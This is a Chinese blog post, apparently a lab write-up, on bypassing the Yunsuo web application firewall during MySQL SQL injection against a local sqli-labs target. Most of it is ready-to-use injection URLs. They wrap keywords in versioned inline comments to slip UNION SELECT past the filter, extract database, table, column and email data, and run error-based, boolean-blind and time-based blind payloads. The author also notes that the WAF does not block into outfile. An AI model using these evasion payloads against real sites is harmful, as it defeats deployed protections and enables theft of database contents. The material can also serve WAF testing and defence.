---
title: "Bypass MySQL Yunsuo"
date: 2019-10-12T22:46:46+08:00
draft: false
tags: []
categories: ['bypass']
---

开锁

<!--more-->

继上文《Bypass MySQL Safedog》。

## 判断注入

智障云锁不拦截and or

```
http://172.16.1.157/sql/Less-1/?id=1' and 1=1 -- +	正常
http://172.16.1.157/sql/Less-1/?id=1' and 1=2 -- +	不正常
```

## 判断字段数

```
http://172.16.1.157/sql/Less-1/?id=1' order by  -- +	拦截
http://172.16.1.157/sql/Less-1/?id=1' order  3 -- +		不拦截
http://172.16.1.157/sql/Less-1/?id=1' by 3 -- +			不拦截
```

那就打乱order by

```
http://172.16.1.157/sql/Less-1/?id=1' order/*!50000*/ by 3 -- +	正常
http://172.16.1.157/sql/Less-1/?id=1' order/*!50000*/ by 4 -- +	不正常
http://172.16.1.157/sql/Less-1/?id=1' order/*!50000by*/  3 -- +	正常
http://172.16.1.157/sql/Less-1/?id=1' order/*!50000by*/  4 -- +	不正常
```

## 联合查询

对union select的拦截比较狠，用all/distinct/distinctrow加内联注释打乱

```
http://172.16.1.157/sql/Less-1/?id=-1' union select 1,2,3 -- +	拦截
http://172.16.1.157/sql/Less-1/?id=-1' union all select 1,2,3 -- +	拦截
http://172.16.1.157/sql/Less-1/?id=-1' union all /*!select 1,2,3 -- +	不拦截
http://172.16.1.157/sql/Less-1/?id=-1' union all /*!select*/ 1,2,3 -- +	拦截
http://172.16.1.157/sql/Less-1/?id=-1' union all /*!00000select*/ 1,2,3 -- +	拦截
http://172.16.1.157/sql/Less-1/?id=-1' union /*!00000all*/ /*!00000select*/ 1,2,3 -- +	不拦截
```

得到结论为在关键字两边包裹内联，如：`/*!00000union*/`

```
http://172.16.1.157/sql/Less-1/?id=-1' /*!00000union*/ /*!00000all*/ /*!00000select*/ 1,2,3 -- +
http://172.16.1.157/sql/Less-1/?id=-1'  union/*!50000distinct /*!50000select*/1,2,database() -- '
http://172.16.1.157/sql/Less-1/?id=-1'  /*!00000union/*!00000 distinct*/ select 1,2,database/**/() -- +
http://172.16.1.157/sql/Less-1/?id=-1'  /*!00000union/*!00000 distinct select*/ 1,2,database/**/() -- +
http://172.16.1.157/sql/Less-1/?id=-1' /*!00000union *//*!00000 /*!distinct select*/ 1,2,database/**/() -- +
```

```
http://172.16.1.157/sql/Less-1/?id=-1' union /*!00000all*/ /*!00000select*/ 1,2,(select table_name) -- +	不拦截
http://172.16.1.157/sql/Less-1/?id=-1' union /*!00000all*/ /*!00000select*/ 1,2,(select table_name from) -- +	拦截
```

使用内联包裹关键字就可以了

库名

```
http://172.16.1.157/sql/Less-1/?id=-1' union /*!00000all*/ /*!00000select*/ 1,2,(/*!00000select*/ schema_name /*!00000from*/ information_schema.schemata  limit 0,1) -- +
```

表名

```
http://172.16.1.157/sql/Less-1/?id=-1' union /*!00000all*/ /*!00000select*/ 1,2,(/*!00000select*/ table_name /*!00000from*/ information_schema.tables where table_schema=database() limit 0,1) -- +
```

列名

```
http://172.16.1.157/sql/Less-1/?id=-1' union /*!00000all*/ /*!00000select*/ 1,2,(/*!00000select*/ column_name /*!00000from*/ information_schema.columns where table_name='emails' and table_schema=database() limit 0,1) -- +
```

查数据

```
http://172.16.1.157/sql/Less-1/?id=-1' union /*!00000all*/ /*!00000select*/ 1,2,(/*!00000select*/ email_id /*!00000from*/ emails  limit 0,1) -- +
```

## 报错注入

```
http://172.16.1.157/sql/Less-1/?id=-1' and /*!00000updatexml*/(1,concat(0x7e,user(),0x7e),1) -- +
```

## 盲注

我手工测得时候发现云锁对盲注友好的很，对于and之后的比较运算符以及字符串截取函数几乎上不拦截，甚至是不用绕。

### 布尔盲注

判断长度

```
http://172.16.1.157/sql/Less-1/?id=1' and length(database())=8 -- +
```

逐位

```
http://172.16.1.157/sql/Less-1/?id=1' and substr(database(),1,1)='s' -- +	http://172.16.1.157/sql/Less-1/?id=1' and left(database(),1)='s' -- +
```

查表

```
http://172.16.1.157/sql/Less-1/?id=1' and substr((/*!00000select*/ table_name /*!00000from*/ information_schema.tables limit 0,1),1,1)='C' -- +
```

可以发现跟上面联合查询一样的，只需要给关键字加内联就行了，布尔盲注就到这。

### 时间盲注

写到这发现if()和sleep()都不用绕。。。

```
http://172.16.1.157/sql/Less-1/?id=1' and if((user()='root@localhost'),sleep(5),1) -- +
```

用到select的时候就用内联就完事了。

## 总结

云锁相比安全狗来讲规则弱的太多了，尤其是对于盲注的拦截，简直不要太友好，对于into outfile也不拦截，算是给安全从业人员留了后路。

ps：有趣的是云锁官网用的是奇安信+云锁双waf

![20191013002322](https://y4er.com/img/uploads/20191013002322.png)

![20191013002442](https://y4er.com/img/uploads/20191013002442.png)




**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**